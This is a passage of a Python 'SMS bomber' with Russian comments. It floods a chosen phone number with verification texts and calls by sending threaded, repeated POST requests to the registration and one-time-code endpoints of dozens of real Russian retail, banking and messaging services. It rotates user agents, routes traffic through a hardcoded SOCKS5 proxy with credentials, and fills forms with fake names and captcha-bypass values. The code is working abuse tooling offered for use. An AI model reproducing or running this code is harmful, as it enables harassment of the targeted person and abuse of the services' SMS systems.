				r = session.post("https://www.tvoyaapteka.ru/bitrix/ajax/ajax_auth_new.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest", "origin": "https://www.tvoyaapteka.ru", "referer": "https://www.tvoyaapteka.ru/personal/?register=yes", "accept": "text/html, */*; q=0.01", "accept-encoding": "gzip, deflate, br", "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, data={"captcha": "", "register": "1", "ajax_key": key, "name": "Буяров Вася Алексейвич", "tel": phone_chaev, "password": "python228P", "confirmmation_agreement": "python228P"})
			except Exception as e:
				print("tvoyaapteka"+str(e))

		def oodji(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://www.oodji.com/ajax/phoneConfirmation.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"phone": phone_chaev, "type": "register"})
			except Exception as e:
				print("oodji"+str(e))

		#запускаем потоки 1 на 1
		threading.Thread(target=utair_2_0, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=cloudtis, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=lenta, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=re_store, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=youla, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=tvoydom, args=(phone_tvoydom, user_agent, proxies,)).start()
		threading.Thread(target=zoloto585, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=d1achcanypala0j, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=b_apteka, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=sberhealth, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=unitiki, args=(phone_unitiki, user_agent, proxies,)).start()
		threading.Thread(target=theobject, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=broniboy, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=rolf, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=mcdonalds, args=(phone_plus, user_agent, proxies,)).start()
		threading.Thread(target=delivery, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=burgerking, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=apteka_ru, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=sunlight, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=kristall, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=htv, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=savetime, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=miratorg, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=unizoo, args=(phone_unizoo, user_agent, proxies,)).start()
		threading.Thread(target=telegram, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=airsoft, args=(phone_unitiki, user_agent, proxies,)).start()
		threading.Thread(target=lvlkitchen, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=modulbank, args=(phone_nine, user_agent, proxies,)).start()
		threading.Thread(target=goldapple, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=karusel, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=mymajor, args=(phone_mymajor, user_agent, proxies,)).start()
		threading.Thread(target=citilink, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=mkb_broker, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=eda_yandex, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=oldi, args=(phone_mymajor, user_agent, proxies,)).start()
		threading.Thread(target=ICQ, args=(phone, proxies,)).start()
		threading.Thread(target=mr_cook, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=pizzahut, args=(phone, proxies,)).start()
		threading.Thread(target=livemaster, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=alltime, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=jumagazin, args=(phone_jumagazin, user_agent, proxies,)).start()
		threading.Thread(target=adamas, args=(phone_nine, user_agent, proxies,)).start()
		threading.Thread(target=omskuvelir, args=(phone_omskuvelir, user_agent, proxies,)).start()
		threading.Thread(target=karatov, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=tinkoff, args=(phone_tinkoff, proxies,)).start()
		threading.Thread(target=askona, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=iconjob, args=(phone, proxies,)).start()
		threading.Thread(target=mtstv, args=(phone, proxies,)).start()
		threading.Thread(target=findclone, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=kari, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=apteka_ot_sklada, args=(phone, user_agent, proxies,)).start()
		threading.Thread(target=tvoyapteka, args=(phone_chaev, user_agent, proxies,)).start()
		threading.Thread(target=oodji, args=(phone_chaev, user_agent, proxies,)).start()

		lap = lap + 1

		if str(lap) == "50":
			print('Прошло 50 кругов. Ваша атака остановлена!')
			sys.exit()

def leg(phone):
	for x in "\nРазработчик бомбера: 0X00077 cовместно с pr0gr1mm3r":
		print(x, end='')
		sys.stdout.flush()
		sleep(0.05)

	if phone[0] == "7":
		try:
			if phone[12] == "":
				print('Вы неправильно ввели номер!')
		except:
			phone_chaev = "+"+str(phone[0:1])+" ("+str(phone[1:4])+") "+str(phone[4:7])+"-"+str(phone[7:9])+"-"+str(phone[9:11]) #+7 (929) 920-88-31
			phone_tvoydom = "+"+str(phone[0:1])+"("+str(phone[1:4])+") "+str(phone[4:7])+"-"+str(phone[7:9])+"-"+str(phone[9:11]) #+7(929) 920-88-31
			phone_unitiki = "+"+str(phone[0:1])+"("+str(phone[1:4])+")"+str(phone[4:7])+"-"+str(phone[7:9])+"-"+str(phone[9:11]) #+7(929)920-88-31
			phone_plus = "+"+str(phone)
			phone_nine = phone[1:11] #9299208831
			phone_unizoo = "8"+" ("+str(phone[1:4])+") "+str(phone[4:7])+"-"+str(phone[7:9])+"-"+str(phone[9:11]) # 8 (929) 920-88-31
			phone_mymajor = "("+str(phone[1:4])+") "+str(phone[4:7])+"-"+str(phone[7:9])+"-"+str(phone[9:11])# (929) 920-88-31
			phone_jumagazin = "+"+str(phone[0:1])+" ("+str(phone[1:4])+") "+str(phone[4:7])+"-"+str(phone[7:9])+str(phone[9:11]) # +7 (929) 920-8831
			phone_omskuvelir = "+"+str(phone[0:1])+" ("+str(phone[1:4])+") "+str(phone[4:7])+" "+str(phone[7:9])+" "+str(phone[9:11]) # +7 (929) 920 88 31
			phone_tinkoff = "+"+str(phone[0:1])+" "+str(phone[1:4])+" "+str(phone[4:7])+" "+str(phone[7:9])+" "+str(phone[9:11]) # 7 929 920 88 31
			print("Атака запущена!")
			threading.Thread(target=service_leg, args=(phone, phone_chaev, phone_tvoydom, phone_unitiki, phone_plus, phone_unizoo, phone_nine, phone_mymajor, phone_jumagazin, phone_omskuvelir, phone_tinkoff,)).start()
	else:
		print('Вы неправильно ввели номер!')

def service_nor(phone, phone_chaev, phone_tvoydom, phone_unitiki, phone_plus, phone_unizoo, phone_nine, phone_mymajor, phone_jumagazin, phone_omskuvelir, phone_tinkoff):
	lap = 0
	header_random = ["Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 YaBrowser/20.9.3.136 Yowser/2.5 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36 Maxthon/5.3.8.2000",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 YaBrowser/20.12.2.105 Yowser/2.5 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/62.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/88.0.4298.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.3; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 10.0; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.123",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 OPR/76.0.4017.94",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.243",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.243"]

	user_agent = random.choice(header_random)

	proxies = {
		"http": 'socks5://sNuU3x:va19h3@5.8.15.120:8000',
		"https": 'socks5://sNuU3x:va19h3@5.8.15.120:8000'
	}

	while True:
		sleep(0.3)
		def utair_2_0(phone, user_agent, proxies):
			try:
				requests.post("https://b.utair.ru/api/v1/login/", headers={'user-agent': str(user_agent), "X-Requested-With": "XMLHttpRequest", "Referer": "https://www.utair.ru/"}, json={"login": phone, "confirmation_type": "call_code"})
			except Exception as e:
				print("utair_2_0"+str(e))

		def cloudtis(phone, user_agent, proxies):
			try:
				requests.post("https://lk.cloudtips.ru/api/auth/sms", headers={'user-agent': str(user_agent)}, json={"phoneNumber": "+"+phone})
			except Exception as e:
				print("cloudtis"+str(e))

		def lenta(phone, user_agent, proxies):
			try:
				requests.post("https://lenta.com/api/v1/registration/requestValidationCode", headers={'user-agent': str(user_agent)}, json={"phone": phone})
			except Exception as e:
				print("lenta"+str(e))

		def re_store(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://re-store.ru/local/components/multisite/system.auth.sms/ajax.php", headers={'user-agent': str(user_agent)}, data={"action": "code_sms", "PERSONAL_PHONE": phone_chaev, "PERSONAL_EMAIL": ""})
			except Exception as e:
				print("re_store"+str(e))

		def youla(phone, user_agent, proxies):
			try:
				requests.post("https://youla.ru/web-api/auth/request_code", headers={'user-agent': str(user_agent)}, json={"phone": phone})
			except Exception as e:
				print("youla"+str(e))

		def tvoydom(phone_tvoydom, user_agent, proxies):
			try:
				requests.post("https://tvoydom.ru/api/internal/component/main:profile.check.phone", headers={'user-agent': str(user_agent)}, data={"tel": phone_tvoydom, "csrf_token": "637dd98cc11c70b51b4e476200cd1442"})
			except Exception as e:
				print("tvoydom"+str(e))

		def zoloto585(phone_chaev, user_agent, proxies):
			try:
				r = requests.post("https://zoloto585.ru/api/bcard/reg2/", headers={"user-agent": str(user_agent)}, json={"name": "Никита", "surname": "Буяров", "patronymic": "Александр", "sex": "m", "birthdate": "05.04.2000", "phone": phone_chaev, "email": "nekirtt@gmail.com", "city": "Москва"})
			except Exception as e:
				print("zoloto585"+str(e))

		def d1achcanypala0j(phone, user_agent, proxies):
			try:
				requests.post("https://xn--j1ab.xn--d1achcanypala0j.xn--p1ai/api/v1/profile/prepare", headers={"user-agent": str(user_agent)}, json={"_form": "reg_signup", "email": "dsdds@gmail.com", "phone": phone, "password": "python228P", "competition_code": "ru_season_4"})
			except Exception as e:
				print("d1achcanypala0j"+str(e))

		def b_apteka(phone, user_agent, proxies):
			try:
				requests.post("https://b-apteka.ru/lk/send_confirm_code", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, json={"phone": phone})
			except Exception as e:
				print("b_apteka"+str(e))

		def sberhealth(phone, user_agent, proxies):
			try:
				requests.post("https://lk.sberhealth.ru/api/gateway/web/rest/v1/auth/sms/initiate", headers={"user-agent": str(user_agent)}, json={"phone": phone})
			except Exception as e:
				print("sberhealth"+str(e))

		def unitiki(phone_unitiki, user_agent, proxies):
			try:
				requests.post("https://unitiki.com/login?action=getCode", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, params={"action": "getCode"}, data={"phone": phone_unitiki})
			except Exception as e:
				print("unitiki"+str(e))

		def theobject(phone, user_agent, proxies):
			try:
				requests.post("https://theobject.ru/ajax/form_send.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"send_form_type": "entry_club", "fio": "Никита", "phone": phone, "date": "11"})
			except Exception as e:
				print("theobject"+str(e))

		def broniboy(phone_chaev, user_agent, proxies):
			try:
				session = requests.Session()
				r = session.get("https://broniboy.ru/moscow/", proxies=proxies)
				csrf = r.text[567:655]
				session.post("https://broniboy.ru/ajax/send-sms", headers={"User-Agent": str(user_agent), "X-CSRF-Token": csrf, "X-Requested-With": "XMLHttpRequest"}, data={"phone": phone_chaev, "_csrf": csrf})
			except Exception as e:
				print("broniboy"+str(e))

		def rolf(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://lk.rolf.ru/api/register-sms-code", headers={"user-agent": str(user_agent)}, json={"phone": phone_chaev})
			except Exception as e:
				print("rolf"+str(e))

		def mcdonalds(phone_plus, user_agent, proxies):
			try:
				requests.post("https://site-api.mcdonalds.ru/api/v1/user/login/phone", headers={"user-agent": str(user_agent)}, json={"number": "+"+phone_plus, "g-recaptcha-response": "off"})
			except Exception as e:
				print("mcdonalds"+str(e))

		def delivery(phone, user_agent, proxies):
			try:
				requests.post("https://api.delivery-club.ru/api1.2/user/otp", headers={"User-Agent": str(user_agent)}, data={"phone": phone, "newotp": "1"})
			except Exception as e:
				print("delivery"+str(e))

		def burgerking(phone, user_agent, proxies):
			try:
				requests.post("https://burgerking.ru/middleware/bridge/api/v3/auth/signup", headers={"User-Agent": str(user_agent)}, json={"phone": phone, "invite": ""})
			except Exception as e:
				print("burgerking"+str(e))

		def apteka_ru(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d64407", headers={"user-agent": str(user_agent)}, params={"cityId": "5e57803249af4c0001d64407"}, json={"phone": phone_chaev})
			except Exception as e:
				print("apteka_ru"+str(e))

		def sunlight(phone, user_agent, proxies):
			try:
				requests.post("https://api.sunlight.net/v3/customers/authorization/", headers={"user-agent": str(user_agent)}, json={"phone": phone})
			except Exception as e:
				print("sunlight"+str(e))

		def kristall(phone_chaev, user_agent, proxies):
			try:
				requests.post('https://www.kristall-shop.ru/ajaxer.php?x=personal', headers={"user-agent": str(user_agent)}, params={"x": "personal"}, data={"action": "sms_send", "phone": phone_chaev})
			except Exception as e:
				print("kristall"+str(e))

		def htv(phone, user_agent, proxies):
			try:
				requests.post("https://24htv.platform24.tv/v2/otps", headers={"user-agent": str(user_agent)}, json={"phone": phone})
			except Exception as e:
				print("htv"+str(e))

		def savetime(phone, user_agent, proxies):
			try:
				requests.post(f"https://api.savetime.net/v2/client/login/{phone}", headers={"user-agent": str(user_agent)}, data={"accept": "1"})
			except Exception as e:
				print("savetime"+str(e))

		def miratorg(phone_chaev, user_agent, proxies):
			try:
				requests.post("https://shop.miratorg.ru/local/include/ajax/order_register_auth.php", headers={"user-agent": str(user_agent)}, data={"action": "request_registration", "LastName": "", "FirstName": "Вика", "MiddleName": "", "MobilePhone": phone_chaev, "Password": "python228", "GenderCode": "M", "BirthDate": "", "EmailAddress": "", "AllowSms": "on", "AllowEmail": "5", "CardNumber": ""})
			except Exception as e:
				print("miratorg --- "+str(e))

		def unizoo(phone_unizoo, user_agent, proxies):
			try:
				requests.post("https://unizoo.ru/local/components/techdir/auth.phone.confirmation.sms/ajax/handler.php", headers={'user-agent': str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"action": "sendCode", "phone": phone_unizoo, "authType": "register", "repeatToEmail": "false"})
			except Exception as e:
				print("unizoo"+str(e))

		def telegram(phone, user_agent, proxies):
			try:
				r = requests.post("https://my.telegram.org/auth/send_password", headers={'user-agent': str(user_agent)}, data={"phone":"+"+phone})
			except Exception as e:
				print("telegram"+str(e))

		def airsoft(phone_unitiki, user_agent, proxies):
			try:
				requests.post("https://airsoft-rus.ru/bitrix/components/bxmt/phone/sms.php", headers={'user-agent': str(user_agent), "x-requested-with": "XMLHttpRequest"}, data={"phone": phone_unitiki, "register": "true"})
			except Exception as e:
				print("airsoft"+str(e))

		def lvlkitchen(phone, user_agent, proxies):
			try:
				requests.post("https://api.crm.p-group.ru/checkout/login", headers={"user-agent": str(user_agent), "x-keypass": "lebfgiuDaeEYiou2%3255$208@{wdw{]}"}, json={"departmentId": 2, "regionId": 2, "phone": phone, "recaptchaToken": "321"})
			except Exception as e:
				print("lvlkitchen"+str(e))

		def modulbank(phone_nine, user_agent, proxies):
			try:
				requests.post("https://my.modulbank.ru/api/v2/auth/repeatSmsCode", headers={"User-Agent": str(user_agent), "X-Requested-With": "XMLHttpRequest", "Accept": "*/*", "Host": "my.modulbank.ru", "RequestSmsId": "defd4054-71d5-46df-954c-4b455b09df4f", "Origin": "https://my.modulbank.ru", "PLATFORM": "web", "Referer": "https://my.modulbank.ru/"}, json={"CellPhone": phone_nine})
			except Exception as e:
				print("modulbank"+str(e))

		def goldapple(phone, user_agent, proxies):
			try:
				r = requests.post("https://goldapple.ru/rest/V1/customer/registration/start", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"}, json={"country_code": "RU", "phone": phone})
			except Exception as e:
				print("goldapple"+str(e))

		def karusel(phone, user_agent, proxies):
			try:
				requests.post("https://app.karusel.ru/api/v2/token/", headers={"User-Agent": str(user_agent)}, json={"phone": phone, "recaptcha_token": "03AGdBq25Dt3tl1ui3Af8OfhYXFuDHFyR-wDo1Fz3CzuAXTid7_I06xC69_B70umoARae7kIS98QbDJfMO4hsuzelfoB9Lm27-ADSmwBANzc8ZtQLBJsrKCfPLAnblFcUbCZNN6af9pedrKGqercyEj76TjSekDiIiubVdAIwAfuKugF5cErx72kgNPGsGqNIBG0jfekZw7ttWfWDYuSgC7m1F-C_Y10GVDgGlUx2ltAAgN98hccQvUZ2jvok7KDo2LO0hy9MB57_q-Pr70DOCxqNehHsrlVHIYPgWZKzsFbRUF1SOqnfI-_D66TV3U4YVOtWUhHfrd3xqQBVDjpYVRcMUiKT_POVK00uijJIFjfMC0jUNbcA5Rg64d1DP4fsCWk02myzLDviNA2nP76Jujuduzu8XSXGjL_GiwvN6WxwRLswnt9DrEC8"})
			except Exception as e:
				print("karusel"+str(e))

		def mymajor(phone_mymajor, user_agent, proxies):
			try:
				requests.post("https://www.mymajor.ru/ajax/mymajor/registration/", headers={"User-Agent": str(user_agent), "X-Requested-With": "XMLHttpRequest", "Accept": "*/*", "Host": "www.mymajor.ru", "Origin": "https://www.mymajor.ru", "Referer": "https://www.mymajor.ru/"}, data={"phone": phone_mymajor, "surname": "Буярова", "name": "Оля", "petronimic": "Александровна", "i_agree_personal_data": "on", "g-recaptcha-response": ""})
			except Exception as e:
				print("mymajor"+str(e))

		def citilink(phone, user_agent, proxies):
			try:
				requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest"})
			except Exception as e:
				print("citilink"+str(e))

		def mkb_broker(phone, user_agent, proxies):
			try:
				requests.post("https://mkb-broker.ru/api/signup/newLogin", headers={"User-Agent": str(user_agent), "X-Requested-With": "XMLHttpRequest"}, json={"appName":"evolution.web","documents":[{"id":110548,"isSigned":"true"},{"id":134504,"isSigned":"true"},{"id":128861,"isSigned":"true"}],"queryParams":{},"phone":phone,"iframe":""})
			except Exception as e:
				print("mkb-broker"+str(e))

		def eda_yandex(phone, user_agent, proxies):
			try:
				requests.post('https://eda.yandex.ru/api/v1/user/request_authentication_code', headers={'user-agent': str(user_agent), "x-requested-with": "XMLHttpRequest"}, json={"phone_number": "+"+phone})
			except Exception as e:
				print("eda.yandex"+str(e))

		def ok_ru(phone, user_agent, proxies):
			try:
				requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", headers={'user-agent': str(user_agent)}, params={"cmd": "AnonymRegistrationEnterPhone", "st.cmd": "anonymRegistrationEnterPhone"}, data={"st.r.phone": "+"+phone})
			except Exception as e:
				print("ok.ru --- "+str(e))

		def oldi(phone_mymajor, user_agent, proxies):
			try:
				requests.post("https://www.oldi.ru/ajax/reg.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest", "origin": "https://www.oldi.ru", "referer": "https://www.oldi.ru/auth/?register=yes&backurl=%2F"}, data={"method": "sendSms", "prefix": "+7", "phone": phone_mymajor})
			except Exception as e:
				print("oldi"+str(e))

		def ICQ(phone, proxies):
			try:
				requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone, "locale": "en", "countryCode": "ua", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			except Exception as e:
				print("ICQ"+str(e))

		def mr_cook(phone, user_agent, proxies):
			try:
				r = requests.post("https://mr-cook.ru/wp-admin/admin-ajax.php", headers={"user-agent": str(user_agent), "x-requested-with": "XMLHttpRequest", "accept": "*/*", "accept-encoding": "gzip, deflate, br", "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7"}, data={"action": "authUser", "phone": "+"+phone})
			except Exception as e:
				print("mr-cook"+str(e))

